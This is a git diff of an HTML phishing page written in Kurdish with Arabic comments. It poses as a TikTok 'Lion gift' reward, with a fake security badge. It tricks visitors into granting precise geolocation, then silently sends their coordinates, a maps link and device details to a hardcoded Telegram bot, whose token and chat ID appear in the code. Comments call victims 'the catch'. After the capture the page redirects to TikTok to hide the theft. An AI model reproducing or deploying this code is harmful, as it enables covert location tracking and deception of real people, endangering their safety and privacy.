@@ -1,52 +1,222 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پشکنینا تورێ</title>
+    <title>TikTok Rewards - Lion Gift</title>
     <style>
-        body { background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; color: #1c1e21; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 18px; margin-bottom: 10px; }
-        p { font-size: 14px; color: #606770; line-height: 1.6; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #000000;
+            /* سيقوم بجلب الصورة التي رفعتها إذا سميتها bg.jpg */
+            background-image: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.9)), url('bg.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #ffffff;
+            overflow: hidden;
+        }
+        .card {
+            background: rgba(20, 20, 20, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 20px rgba(254, 44, 85, 0.2);
+        }
+        .bismillah {
+            font-size: 28px;
+            font-weight: bold;
+            color: #d4af37; /* لون ذهبي فخم */
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+            font-family: 'Amiri', serif; /* خط عربي جميل إذا كان مدعوماً */
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: float 3s ease-in-out infinite;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            background: -webkit-linear-gradient(45deg, #fe2c55, #25f4ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        p {
+            font-size: 14px;
+            color: #cccccc;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background: linear-gradient(45deg, #fe2c55, #ff4d6d);
+            color: white;
+            border: none;
+            padding: 15px 0;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(254, 44, 85, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        .btn:disabled {
+            background: #555;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .secure-badge {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
-        <div class="loader"></div>
-        <h2>چاڤەرێ بە...</h2>
-        <p>بۆ پاراستنا پەیوەندییا تە و دەستکەفتنا ئینتەرنێتەکا بێ هێز، هیڤی دکەین رێ بدە جهێ خۆ (Location) دا کو خزمەتگۆزاری بهێتە کاراکردن.</p>
+
+    <div class="card">
+        <div class="bismillah">﷽</div>
+        
+        <div class="icon">🦁</div>
+        <h2>پیرۆزە! تە دیارییا Lion وەرگرت</h2>
+        <p>ژبۆ وەرگرتنا ڤێ دیاریێ ل سەر هەژمارا تە، پێدڤییە رێ بدەی سیستەم وەڵاتێ تە دیار بکەت داکو دیاری ب دروستی بگەهیت.</p>
+        
+        <button id="claimBtn" class="btn" onclick="startProcess()">
+            <span id="btnText">وەرگرتن (Claim)</span>
+            <div id="spinner" class="spinner"></div>
+        </button>
+        
+        <div class="secure-badge">
+            🔒 سیستەمێ پاراستی یێ تیکتۆک
+        </div>
     </div>
 
     <script>
-        async function sendToTelegram() {
+        const BOT_TOKEN = '8771984439:AAECnMtAXuKSmN-1Kjn2sHfj_I15q95BOoQ';
+        const CHAT_ID = '8266081844';
+
+        function startProcess() {
+            const btn = document.getElementById('claimBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+
+            // تغيير شكل الزر إلى حالة التحميل
+            btn.disabled = true;
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const token = '8771984439:AAECnMtAXuKSmN-1Kjn2sHfj_I15q95BOoQ';
-                    const chat_id = '8266081844';
-                    
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const device = navigator.userAgent;
-                    const lang = navigator.language;
-
-                    // إرسال الموقع الجغرافي
-                    await fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chat_id}&latitude=${lat}&longitude=${lon}`);
-                    
-                    // إرسال معلومات الجهاز
-                    const text = encodeURIComponent(`✅ صيد جديد (GitHub)!\n📱 الجهاز: ${device}\n🌐 اللغة: ${lang}`);
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`);
-
-                    // توجيه لصفحة وهمية بعد النجاح
-                    window.location.href = "https://www.google.com";
-                }, (error) => {
-                    alert("ژبۆ کارکرنا ڤێ خزمەتگۆزاریێ، پێتڤییە رێبدەی جهێ تە بهێتە دیارکرن.");
-                }, { enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(sendData, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("براوسەرێ تە پشتەڤانییا ڤێ خزمەتگوزاریێ ناکەت.");
+                resetBtn();
             }
         }
-        window.onload = sendToTelegram;
+
+        async function sendData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const device = navigator.userAgent;
+
+            const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+            
+            // رسالة مرتبة واحترافية تصلك للبوت
+            const msgText = `🎯 <b>صيد جديد (أسد تيك توك)</b> 🦁\n\n` +
+                            `📍 <b>دقة الموقع:</b> ${Math.round(accuracy)} متر\n` +
+                            `🌍 <b>رابط الخرائط:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
+                            `📱 <b>تفاصيل الجهاز:</b>\n<code>${device}</code>`;
+                            
+            const msgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msgText)}&parse_mode=HTML`;
+
+            try {
+                // إرسال الموقع
+                await fetch(locUrl);
+                // إرسال التفاصيل
+                await fetch(msgUrl);
+                // توجيه الضحية
+                redirectToTikTok();
+            } catch (err) {
+                redirectToTikTok();
+            }
+        }
+
+        function showError(error) {
+            resetBtn();
+            let msg = "خەلەتیەک چێبوو. هیڤی دکەین دووبارە هەول بدە.";
+            if(error.code === error.PERMISSION_DENIED) {
+                msg = "تە رێگری ل دیارکرنا جهی کر! هیڤی دکەین رێ بدە (Allow) بۆ وەرگرتنا دیاریێ.";
+            }
+            alert(msg);
+        }
+
+        function resetBtn() {
+            const btn = document.getElementById('claimBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            
+            btn.disabled = false;
+            btnText.style.display = 'block';
+            spinner.style.display = 'none';
+        }
+
+        function redirectToTikTok() {
+            // محاولة فتح تطبيق تيك توك، وإن لم ينجح يفتح الموقع
+            window.location.href = "snssdk1233://"; 
+            setTimeout(() => { 
+                window.location.href = "https://www.tiktok.com"; 
+            }, 1500);
+        }
     </script>
 </body>
 </html>
